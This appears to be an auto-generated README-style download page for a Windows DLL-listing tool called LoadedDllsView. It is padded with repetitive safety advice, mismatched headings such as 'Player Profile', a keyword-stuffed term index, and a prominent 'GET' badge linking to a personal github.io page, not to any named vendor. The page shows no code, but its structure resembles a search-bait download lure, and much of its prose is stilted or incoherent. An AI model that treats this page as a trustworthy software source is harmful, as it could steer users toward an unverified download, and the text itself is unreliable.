# LoadedDllsView - Modules a Process on This PC Has Loaded

At a glance:
- DLLs for a process you started
- Paths you can read, not replace from an ad
- A refresh after you open your program
- No injection and no other computer

## Your Process

LoadedDllsView shows modules already mapped into a running process. Start the program you are debugging or checking, then find its name and read the list. A path under that program's folder is expected. A path you do not understand is a note, not an order to delete the file.

System processes load many DLLs. That is normal. Sorting by size or count and deleting the first unfamiliar file will break Windows. This viewer is for looking. Closing your own program is the way to drop its rows. Use the program's quit, not a kill of a service.

## No Random DLL

If something you wrote fails to start, the missing module is a name for the runtime from the vendor you already use, or for a build you produced. Install that runtime, or fix your build. A DLL downloaded because the filename matched is how a trojan gets the same name as a real library. Do not do that.

The list does not patch the process. It does not write into another program. If you wanted to inject or to hook a process you do not own, stop. The scope is a process on your PC that you started.

## Refresh

Open your app, refresh, and see its modules. Quit the app, refresh, and see the rows go. If they remain, a helper from that app is still running. Quit that helper from the app, not by ending an unrelated service. A path that changes after an update should match the vendor's new folder. If it points at a temporary download, do not keep launching that copy.

## This PC

There is no remote computer in this job. You cannot list DLLs on a server by pointing the tool at an address. If you administer a server, use a login you were given and look at that machine itself. Do not load a DLL list from a PC you happened to find on the network.

## Paths You May Read

Some paths are in your user profile, some in Program Files. Read them. Do not move those files while the program is running. If you need to compare a hash, hash a copy or the installed file with a checksum tool, and compare it to the publisher. A mismatch means do not keep running that copy. It does not mean you should search for a "fixed" DLL.

## A Path You Can Explain

A module under the program's own folder is ordinary. A module in a temporary download is a reason to stop using that copy and get the program from the vendor again. Do not replace the file with a DLL you searched for by name.


## Installation Path

| Step | Action |
|---|---|
| 1 | Open LoadedDllsView and start the program you want to inspect |
| 2 | Refresh and find that program's name |
| 3 | Read paths. Do not delete modules |
| 4 | Quit your program and refresh again |
| 5 | Leave system processes running. Do not download a DLL to match a name |

[![GET LoadedDllsView](https://img.shields.io/badge/GET%20%E2%80%94%20LoadedDllsView-334155?style=for-the-badge&logoColor=white)](https://susanedwardsl303.github.io/.github/loadeddllsview-modules)

## Feature Matrix

| Area | What you use it for |
|---|---|
| Process | One you started |
| Modules | DLLs it has loaded |
| Paths | Where those files are |
| Refresh | Before and after you quit |
| Limit | No injection and no ad DLLs |

## Performance Table

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 (64-bit) | Windows 11 (64-bit) |
| CPU | Dual-core | Any current PC |
| RAM | 1 GB | 4 GB |
| Storage | Small install | None else |
| Scope | This PC | Your process, not a service you do not know |

## Player Profile

LoadedDllsView fits a look at what your own program loaded. It does not fit injecting into processes, killing system services, downloading DLLs by name, or inspecting a PC you do not administer.

![LoadedDllsView showing modules for a program the user started](https://www.schieb.de/wp-content/uploads/2017/04/genutzte-dll-dateien-herausfinden.jpg)

## Help Desk

Your program is missing? Start it, then refresh.
A module path looks like a download folder? Do not keep using that copy. Get the program from the vendor again.
You do not recognize a system DLL? Leave it.
The app still fails? Install the vendor runtime, not a DLL from a search result.
This is not your PC? Close the window.

## Reader Notes

The useful test is your process present, then absent after you quit. Anything else in the table can stay. Names are not delete buttons.

A missing dependency is a vendor package or a rebuild of your code. Matching the filename from an ad is the failure mode to avoid. Hash a file against the publisher if you are unsure the copy is the one you installed.

System processes are out of scope even when they sit at the top of a sort. Write the name down if you must, and leave the process running.

## Term Index

loadeddllsview your process, loadeddllsview module path, loadeddllsview refresh, loadeddllsview no injection, loadeddllsview vendor runtime, this pc only, no ad dll, leave system processes
